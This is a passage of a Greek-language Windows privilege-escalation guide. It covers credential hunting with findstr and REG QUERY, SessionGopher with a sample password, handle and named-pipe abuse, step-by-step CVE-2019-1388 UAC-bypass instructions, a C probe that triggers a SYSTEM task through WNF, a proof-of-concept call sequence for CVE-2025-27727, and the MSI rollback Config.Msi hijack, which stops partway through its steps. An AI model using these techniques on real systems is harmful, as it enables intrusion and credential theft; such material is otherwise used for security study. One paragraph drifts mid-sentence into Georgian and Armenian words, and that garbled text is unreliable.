Για το Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιού και κρυπτογραφημένων συνδέσεων. Η παρουσία τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι αναγνώσιμα και τα δύο αρχεία, αν υπάρχουν αποθηκευμένες εγγραφές και αν ένας Primary Password προστατεύει το κλειδί, προτού συμπεράνετε ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν. Αν ένα διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό domain, ελέγξτε ξεχωριστά τα πραγματικά δικαιώματα ελέγχου ομάδων αυτού του λογαριασμού και τα [δικαιώματα ανάγνωσης ή αποκρυπτογράφησης κωδικού LAPS](../active-directory-methodology/laps.md) της ομάδας· τα τεχνουργήματα του προγράμματος περιήγησης από μόνα τους δεν αποδεικνύουν ότι υπάρχει διαδρομή προς δικαιώματα διαχειριστή.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Αντικατάσταση COM DLL**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **αναγνωρίζεται μέσω ενός class ID (CLSID)** και εκθέτει λειτουργίες μέσω μίας ή περισσότερων διεπαφών, οι οποίες αναγνωρίζονται μέσω interface ID (IID).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο registry, αντίστοιχα, στις διαδρομές **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό registry **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (ουδέτερο ως προς το Thread).

![Ιστορικό προγραμμάτων περιήγησης - Αντικατάσταση COM DLL: Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό registry InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε τα δικαιώματά σας**, εάν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και registry**

**Αναζήτηση στα περιεχόμενα αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία που αναζητούν κωδικούς πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που δημιούργησα για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά διαπιστευτήρια** στο εσωτερικό του θύματος.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτή τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** για διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Διαρροή Handles

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια, η οποία κληρονομεί όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Έπειτα, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά προνόμια**, μπορείτε να αρπάξετε το **ανοιχτό handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **κάνετε inject ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με το πώς να ελέγξετε και να καταχραστείτε περισσότερα ανοιχτά handles διεργασιών και νημάτων που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonation πελάτη Named Pipe

Τα τμήματα κοινόχρηστης μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε σάς δίνει την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια**, υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, δείτε τους χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταχώριση και προβολή όλων των pipes για τον εντοπισμό privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Απομακρυσμένη εγγραφή DWORD στο Telephony tapsrv για RCE

Η υπηρεσία Telephony (TapiSrv) σε λειτουργία server εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει μια αυθαίρετη DLL ως υπηρεσία. Η πλήρης διαδικασία:

- `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή στην οποία επιτρέπεται η εγγραφή → η υπηρεσία την ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει το ελεγχόμενο από τον επιτιθέμενο `InitContext` από το `Initialize` σε αυτό το handle. Καταχωρίστε μια εφαρμογή line με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε τα δεδομένα μέσω του `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, ακυρώστε την καταχώριση/τερματίστε τη λειτουργία για να επαναλάβετε ντετερμινιστικές εγγραφές.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και, στη συνέχεια, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν ενέργειες στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση Protocol handler / ShellExecute μέσω Markdown renderers

Οι Markdown σύνδεσμοι στους οποίους μπορεί να γίνει κλικ και προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχει ο επιτιθέμενος ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση command lines για κωδικούς πρόσβασης**

Όταν αποκτάτε ένα shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη command line**. Το παρακάτω script καταγράφει τις command lines των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη χαμηλών προνομίων σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM", ενώ είστε μη προνομιούχος χρήστης.

Έτσι, μπορείτε να κλιμακώσετε τα προνόμιά σας και ταυτόχρονα να παρακάμψετε το UAC, εκμεταλλευόμενοι την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα, ενώ το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Μερικά από τα συστήματα που επηρεάζονται είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, πρέπει να εκτελέσετε τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Εισαγωγή Upload Directory Junctions σε Served Root

Μια εφαρμογή μπορεί να δημιουργεί έναν προβλέψιμο υποκατάλογο upload, να γράφει σε αυτόν ένα όνομα αρχείου που παρέχει ο καλών και έπειτα να επεξεργάζεται το αρχείο. Αν ένας χρήστης με χαμηλά προνόμια μπορεί να διαγράψει και να αντικαταστήσει αυτόν τον υποκατάλογο με ένα NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction και να καταλήξει σε έναν web-served κατάλογο. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί με την ταυτότητα της web service, εφόσον ο server εκτελεί αυτόν τον τύπο αρχείου. Πρόκειται για όριο αυθαίρετης εγγραφής που εξαρτάται από την εφαρμογή· ένας εγγράψιμος κατάλογος upload ή ένα υπάρχον junction από μόνο του δεν αρκεί για να το αποδείξει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και το χρονικό σημείο στον upload handler, τα πραγματικά δικαιώματα διαγραφής/δημιουργίας του χρήστη στον υποκατάλογο, τα πραγματικά ACL του προορισμού, αν η διαδικασία εγγραφής ακολουθεί reparse points και αν ο web server εκτελεί αρχεία σε αυτόν τον προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες διεργασίας της διαδικασίας εγγραφής και του web server. Η παθητική απογραφή μπορεί να εμφανίσει ACL καταλόγων και μεταδεδομένα reparse, αλλά δεν μπορεί να διαπιστώσει τη συμπεριφορά του handler ή μια μελλοντική αλλαγή junction. Αν η εκτέλεση γίνει με λογαριασμό υπηρεσίας, εξετάστε το **πραγματικό token της διεργασίας** πριν εξετάσετε τυχόν ξεχωριστή διαδρομή μέσω δικαιωμάτων token.

## Εκκαθάριση προγραμματισμένης εργασίας με προνόμια μέσω WNF trigger

Μια προγραμματισμένη εργασία που αρνείται τη μη αυτόματη εκτέλεση μπορεί παρ' όλα αυτά να διαθέτει ένα trigger που μπορεί να ενεργοποιήσει χρήστης χωρίς προνόμια. Κατά τον έλεγχο μιας εργασίας με προνόμια, εξαγάγετε το XML της και εξετάστε **όλα** τα triggers, καθώς και το DACL της εργασίας, τον principal και την ενέργεια. Ειδικότερα, ένα `WnfStateChangeTrigger` προσδιορίζει μια κατάσταση του Windows Notification Facility (WNF)· αν αυτή η securable κατάσταση επιτρέπει στον τρέχοντα χρήστη να δημοσιεύσει μια ενημέρωση, ο χρήστης μπορεί να ξεκινήσει έμμεσα την εργασία με την ταυτότητα που έχει ρυθμιστεί για αυτήν, παρά το `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Για παράδειγμα, η εργασία Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` εκτελούνταν ως SYSTEM, δεχόταν ενημερώσεις στην κατάσταση WNF `7508BCA32C079E41` από έναν τυπικό χρήστη και στη συνέχεια εξέταζε το `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` ακόμη και όταν το Recall ήταν απενεργοποιημένο.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Για να ελέγξετε την προσβασιμότητα, επιλύστε τη `ZwUpdateWnfStateData` από το `ntdll.dll`, υποβάλετε μια κενή ενημέρωση για το οκτα-byte όνομα κατάστασης και συσχετίστε την κατάσταση επιστροφής με τα δεδομένα τελευταίας εκτέλεσης του task ή τη δραστηριότητα στο Procmon. Το παρακάτω απλοποιημένο probe χρησιμοποιεί την ακολουθία byte από το παράδειγμα του Recall task· αντικαταστήστε τα byte με εκείνα που έχουν εξαχθεί για το task που δοκιμάζεται.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Μετατροπή του αναδρομικού καθαρισμού σε προνομιούχα διαγραφή

Το χρήσιμο primitive δεν είναι μόνο το trigger, αλλά μια προνομιούχα ρουτίνα καθαρισμού που δέχεται έναν κατάλογο ελεγχόμενο από τον επιτιθέμενο. Παρακολουθήστε τη λειτουργία από την απαρίθμηση έως την τελική τροποποίηση: ο εντοπισμός προφίλ/συνεδριών, τα παιδιά που επιλέγονται μέσω wildcard, τα `SHCreateItemFromParsingName` και `IFileOperation::DeleteItem` αποτελούν ισχυρές ενδείξεις ότι μια διαδρομή που ελέγχθηκε προηγουμένως θα διασχιστεί αργότερα αναδρομικά. Αν οι απόγονοι δεν ανοίγονται σε σχέση με έμπιστα handles καταλόγων και δεν επικυρώνονται πριν από τη διαγραφή, ο επιτιθέμενος μπορεί να αλλάξει τον τρόπο επίλυσης της διαδρομής μεταξύ απαρίθμησης και χρήσης.<sup>[[43]](#references)</sup>

Συνδυάστε το WNF trigger με την [αντικατάσταση μέσω oplock, junction και συμβολικού συνδέσμου του Object Manager](#from-folder-contents-delete-to-system-eop) που περιγράφεται παρακάτω: το oplock παγώνει τον cleaner αφού επιλέξει το νόμιμο παιδί, ενώ ο εγγράψιμος πρόγονος αντικαθίσταται, ώστε η προνομιούχα διαγραφή που συνεχίζεται να επιλύει τη διαδρομή μέσω του `\RPC Control` προς τον προστατευμένο στόχο. Στην αλυσίδα Recall, αυτό οδήγησε σε διαγραφή του `C:\Config.Msi` από το SYSTEM, όπως απαιτείται από την τεκμηριωμένη τεχνική MSI rollback.<sup>[[31]](#references)[[43]](#references)</sup>

### Οι εμφωλευμένοι απόγονοι παρακάμπτουν τις επιφανειακές διορθώσεις για reparse points

Η επικύρωση μόνο της ρίζας που ελέγχει ο επιτιθέμενος και του άμεσου παιδιού της δεν ασφαλίζει μια αναδρομική διαγραφή βάσει διαδρομής. Διατηρήστε αυτά τα ελεγμένα αντικείμενα νόμιμα και μεταφέρετε την αντικατάσταση junction/oplock σε ένα επιπλέον παιδί κάτω από αυτά· το `IFileOperation::DeleteItem` θα φτάσει τελικά στον μη επικυρωμένο απόγονο και θα ακολουθήσει τον νέο προορισμό του. Το CVE-2026-20941 προέκυψε ακριβώς από αυτή την κατηγορία ελλιπούς διόρθωσης, αφού η πρώτη διόρθωση του Recall επικύρωσε τα `UKP` και τον κατάλογο με μορφή GUID, αλλά διατήρησε την παλιά λειτουργία αναδρομικής διαγραφής.<sup>[[43]](#references)</sup>

Η ασφαλής πρακτική είναι να ανοίγετε **κάθε απόγονο** σε σχέση με ένα ήδη έμπιστο handle καταλόγου, να λαμβάνετε και να επαληθεύετε την τελική επιλυμένη διαδρομή/το αντικείμενο και να εφαρμόζετε τη διάθεση διαγραφής σε αυτό το επαληθευμένο handle. Μην επικυρώνετε ένα πρόθεμα και μετά επιστρέφετε σε αναδρομική διαγραφή βάσει διαδρομής. Κατά την εξέταση μιας διόρθωσης, ελέγξτε επίσης τις δομές στο πραγματικό σημείο κλήσης: σε αυτή την περίπτωση, η επιθεώρηση κατά την εκτέλεση του `OBJECT_ATTRIBUTES` στο `NtCreateFile` έδειξε μη μηδενικό `RootDirectory` και σχετικό όνομα `{GUID}\\secure_file.lock`, καταρρίπτοντας την παραπλανητική έξοδο του decompiler που υπέδειχνε δεύτερο primitive `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με κώδικα exploit [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση βασίζεται στην κατάχρηση της δυνατότητας rollback του Windows Installer, ώστε να αντικατασταθούν νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό, ο επιτιθέμενος πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για την παραβίαση του φακέλου `C:\Config.Msi`. Στη συνέχεια, ο Windows Installer θα χρησιμοποιήσει αυτόν τον φάκελο για την αποθήκευση αρχείων rollback κατά την απεγκατάσταση άλλων πακέτων MSI, όπου τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

### Έγχυση διαδρομής καθαρισμού μέσω COM του Windows Installer (CVE-2025-27727)

Ένας χρήστης με χαμηλά προνόμια μπορεί να αποκτήσει πρόσβαση στην υπηρεσία `msiexec.exe` ως SYSTEM μέσω του αντικειμένου COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Η αντίστροφη μηχανική εντόπισε τις σχετικές κλήσεις `IMsiServer`: `MsiBeginTransactionW` στη μετατόπιση vtable `0xA0`, `SetEEUIDirectoryAndFilter` στη `0xC8` και `CleanupTempPackages` στη `0x50`. Αυτά τα ονόματα και οι μετατοπίσεις προέκυψαν από αντίστροφη μηχανική και ενδέχεται να διαφέρουν μεταξύ builds.<sup>[[41]](#references)</sup>

Για χρήστη που δεν არის διαχειριστής, το `SetEEUIDirectoryAndFilter` μιանձնագրվում է caller-ին միայն այն ժամանակ, երբ բացում է փոխանցված διαδρομή με `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` և `FILE_FLAG_OPEN_REPARSE_POINT`. Αυτό αποδεικνύει ότι ο caller μπορεί να διαγράψει τον κατάλογο και αποφεύγει την παρακολούθηση ενός reparse point, αλλά **δεν** συνδέει το ελεγμένο αντικείμενο αρχείου με τον μεταγενέστερο καθαρισμό ούτε αποδεικνύει ότι το δημιούργησε το Windows Installer.<sup>[[41]](#references)</sup>

Μετά το `MsiBeginTransactionW`, το `SetEEUIDirectoryAndFilter` προγραμματίζει τη διαδρομή ως φάκελο, ανεξάρτητα από το όρισμα φίλτρου του caller. Η υπηρεσία εγγράφει μια ονομασμένη τιμή `REG_DWORD` κάτω από το `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: το όνομα της τιμής είναι η διαδρομή που ελέγχει ο caller και τα δεδομένα `0x00000002` είναι η σημαία φακέλου. Έπειτα, το `CleanupTempPackages(NULL, FALSE)` ξεκινά απευθείας τον καθαρισμό. Η προνομιούχα worker απαριθμεί τις τιμές μητρώου και περνά τις εγγραφές φακέλων στην αναδρομική `FDeleteFolder`, χωρίς να ελέγχει την προέλευση των διαδρομών. Αν η κανονική αφαίρεση αποτύχει, ο κώδικας καλεί επίσης τη `LockdownPath`, διαγράφει τα χαρακτηριστικά αρχείου και επαναλαμβάνει την προσπάθεια.<sup>[[41]](#references)</sup>

Η ελάχιστη ακολουθία κλήσεων που ανακτήθηκε από το `msi.dll` είναι:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Το χρήσιμο primitive είναι η επαναχρησιμοποίηση της διαδρομής και όχι η ανακατεύθυνση μέσω junction. Καταχώρισε ένα `C:\Config.Msi` που έχει δημιουργήσει ο attacker, αφαίρεσέ το και άφησε το Windows Installer να δημιουργήσει ξανά αργότερα την ίδια διαδρομή, αυτήν τη φορά με προστατευμένα rollback δεδομένα. Η εκκαθάριση εμπιστεύεται το παλιό όνομα `TempPackages` και διαγράφει τον νέο κατάλογο ως SYSTEM. Αυτό παρακάμπτει το προβλεπόμενο όριο προστασίας των `FILE_FLAG_OPEN_REPARSE_POINT` και της mitigation για εμπιστοσύνη στις ανακατευθύνσεις, καθώς δεν απαιτείται reparse point.<sup>[[41]](#references)</sup>

Αυτό το primitive διαγραφής εντάσσεται στην παρακάτω αλυσίδα rollback: διατήρησε την ξεχωριστή εγγραφή `Installer\Folders`, διέγραψε το προστατευμένο `C:\Config.Msi`, δημιούργησέ το ξανά με NULL DACL και διατήρησε ένα handle με δικαίωμα `WRITE_DAC`, προτού το installer ενισχύσει την DACL. Το handle που έχει ανοιχτεί εκ των προτέρων μπορεί να επαναφέρει μια επιτρεπτική DACL με το `NtSetSecurityObject`, μετά την οποία μπορείς να αντικαταστήσεις το παραγόμενο `.rbs` πριν συνεχιστεί το rollback.<sup>[[41]](#references)</sup>

Η Microsoft διόρθωσε το πρόβλημα αποτρέποντας την κλήση της `ScheduleFileOrFolderDelete` από την `CMsiTransaction::SetEEUIDirectoryAndFilter` όταν είναι ενεργοποιημένο το νέο feature gate. Η COM κλήση μπορεί να εξακολουθεί να επιστρέφει επιτυχία, αλλά δεν προσθέτει πλέον τη διαδρομή που ελέγχει ο attacker στο `TempPackages`. Εγκατάστησε τις ενημερώσεις ασφαλείας των Windows του Απριλίου 2025 αντί να χρησιμοποιείς την επιτυχή επιστροφή της μεθόδου ως έλεγχο για το αν εφαρμόστηκε το patch.<sup>[[41]](#references)[[42]](#references)</sup>

Η συνοπτική τεχνική είναι η εξής:

1. **Στάδιο 1 – Προετοιμασία για το Hijack (άφησε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκατάσταση του MSI
    - Δημιούργησε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
    - Δήλωσε το installer ως **"UAC Compliant"**, ώστε να μπορεί να το εκτελέσει ένας **μη διαχειριστής**.
    - Κράτησε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Έναρξη απεγκατάστασης
    - Απεγκατάστησε το ίδιο `.msi`.
    - Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (αντίγραφα ασφαλείας rollback).
    - **Έλεγχε περιοδικά το ανοιχτό file handle** με το `GetFinalPathNameByHandle`, ώστε να εντοπίσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Προσαρμοσμένος συγχρονισμός
    - Το `.msi` περιλαμβάνει μια **custom ενέργεια απεγκατάστασης (`SyncOnRbfWritten`)** που:
        - Σηματοδοτεί ότι έχει γραφτεί το `.rbf`.
        - Έπειτα **περιμένει** ένα άλλο event πριν συνεχίσει η απεγκατάσταση.

- Βήμα 4: Αποτροπή διαγραφής του `.rbf`
    - Όταν λάβεις το σήμα, **άνοιξε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — έτσι **αποτρέπεται η διαγραφή του**.
    - Έπειτα **στείλε σήμα πίσω**, ώστε να ολοκληρωθεί η απεγκατάσταση.
    - Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **δεν αφαιρεί το `C:\Config.Msi`**.

- Βήμα 5: Χειροκίνητη διαγραφή του `.rbf`
